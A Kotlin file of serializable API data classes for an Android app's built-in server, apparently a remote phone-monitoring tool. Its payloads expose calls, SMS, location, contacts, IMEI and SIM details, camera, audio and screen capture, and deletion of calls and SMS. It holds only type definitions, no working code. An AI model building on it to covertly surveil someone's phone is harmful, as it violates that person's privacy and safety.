package com.xiangqin.app.server

import com.xiangqin.app.data.db.*
import kotlinx.serialization.Serializable

@Serializable
data class LoginRequest(val username: String, val password: String)
@Serializable
data class PasswordChangeRequest(val oldPassword: String, val newPassword: String)

@Serializable
data class MessageResponse(val message: String)
@Serializable
data class ErrorResponse(val error: String)

@Serializable
data class LocationsResponse(val count: Int, val points: List<LocationPoint>, val latest: LocationEntity?)
@Serializable
data class LocationPoint(val latitude: Double, val longitude: Double, val accuracy: Float, val time: Long)

@Serializable
data class BluetoothResponse(val devices: List<BluetoothDeviceEntity>, val count: Int)
@Serializable
data class WifiResponse(val networks: List<WifiNetworkEntity>, val count: Int)

@Serializable
data class MediaResponse(
    val files: List<MediaFileEntity>,
    val counts: Map<String, Int>,
    val count: Int,
    val type: String? = null
)

@Serializable
data class DashboardResponse(
    val callsToday: Int,
    val smsToday: Int,
    val lastLocation: LocationEntity?,
    val bluetoothDeviceCount: Int,
    val wifiNetworkCount: Int,
    val currentActivity: String?,
    val photoCount: Int,
    val audioRecordingCount: Int,
    val isRecording: Boolean
)

@Serializable
data class LocationLatestResponse(val location: LocationEntity?, val hasLocation: Boolean)
@Serializable
data class ActivityListResponse(val activities: List<ActivityEntity>, val count: Int)
@Serializable
data class SensorListResponse(val sensors: List<SensorEntity>, val count: Int)
@Serializable
data class AccountListResponse(val accounts: List<AccountEntity>, val count: Int)
@Serializable
data class PhotoListResponse(val photos: List<PhotoEntity>, val count: Int)
@Serializable
data class AudioRecordingListResponse(val recordings: List<AudioRecordingEntity>, val count: Int)
@Serializable
data class CalendarEventListResponse(val events: List<CalendarEventEntity>, val count: Int)
@Serializable
data class WifiActionResponse(val message: String)
@Serializable
data class CameraCaptureResponse(val message: String, val path: String, val id: Long)
@Serializable
data class AudioStopResponse(val message: String, val path: String, val durationMs: Long, val fileSize: Long, val id: Long)

@Serializable
data class AlertListResponse(val alerts: List<AlertEntity>, val total: Int, val unacknowledged: Int)

@Serializable
data class AlertSettingsResponse(
    val enabled: Map<String, Boolean>,
    val home: HomeZone?,
    val feishuWebhook: String?
)

@Serializable
data class AlertSettingsUpdateRequest(
    val enabled: Map<String, Boolean>? = null,
    val home: HomeZone? = null,
    val feishuWebhook: String? = null
)

@Serializable
data class NotificationListResponse(val notifications: List<NotificationEntity>, val count: Int)

@Serializable
data class DeviceAdminStatusResponse(val active: Boolean)

@Serializable
data class DeviceInfoResponse(
    val modelName: String, val brand: String, val device: String,
    val androidVersion: String, val sdkVersion: Int,
    val imei: String, val phoneNumber: String,
    val simOperator: String, val simSerial: String,
    val networkType: Int, val dataState: Int, val isNetworkRoaming: Boolean,
    val batteryLevel: Int, val isCharging: Boolean
)

@Serializable
data class ScreenRecordStatusResponse(val recording: Boolean, val file: String)

@Serializable
data class ScreenRecordStartResponse(val message: String, val requireAuth: Boolean = false)

@Serializable
data class ScreenshotResponse(val path: String, val size: Long)

@Serializable
data class SystemSettingsResponse(
    val musicVolume: Int, val musicMax: Int,
    val ringVolume: Int, val ringMax: Int,
    val alarmVolume: Int, val alarmMax: Int
)

@Serializable
data class SystemSettingsUpdateResponse(val message: String, val updated: List<String>)

@Serializable
data class AppInfo(
    val packageName: String, val appName: String,
    val versionName: String, val isSystem: Boolean,
    val installTime: Long, val updateTime: Long
)
@Serializable
data class AppListResponse(val apps: List<AppInfo>, val count: Int)

@Serializable
data class FileInfo(
    val name: String, val isDirectory: Boolean,
    val size: Long, val lastModified: Long, val path: String
)
@Serializable
data class FileListResponse(val path: String, val files: List<FileInfo>, val count: Int)

@Serializable
data class ContactInfo(val id: String, val name: String, val phone: String)
@Serializable
data class ContactListResponse(val contacts: List<ContactInfo>, val count: Int)

@Serializable
data class SystemLogInfo(val id: Long, val logType: String, val message: String, val createdTime: Long)
@Serializable
data class SystemLogListResponse(val logs: List<SystemLogInfo>, val count: Int)

@Serializable
data class CallDeleteResponse(val message: String, val callId: String? = null, val count: Int? = null)

@Serializable
data class SmsDeleteResponse(val message: String, val smsId: String? = null)

@Serializable
data class DashboardStatsResponse(
    val callsToday: Int, val smsToday: Int,
    val lastLocation: LocationEntity?,
    val bluetoothDeviceCount: Int, val wifiNetworkCount: Int,
    val currentActivity: String?,
    val photoCount: Int, val audioRecordingCount: Int,
    val alertToday: Int, val notificationCount: Int,
    val contactCount: Int, val isRecording: Boolean
)

@Serializable
data class BatteryInfoResponse(
    val level: Int, val isCharging: Boolean,
    val pluggedType: Int, val intervalMultiplier: Double
)

@Serializable
data class NetworkOverviewResponse(
    val wifiNetworks: List<WifiNetworkEntity>,
    val bluetoothDevices: List<BluetoothDeviceEntity>
)
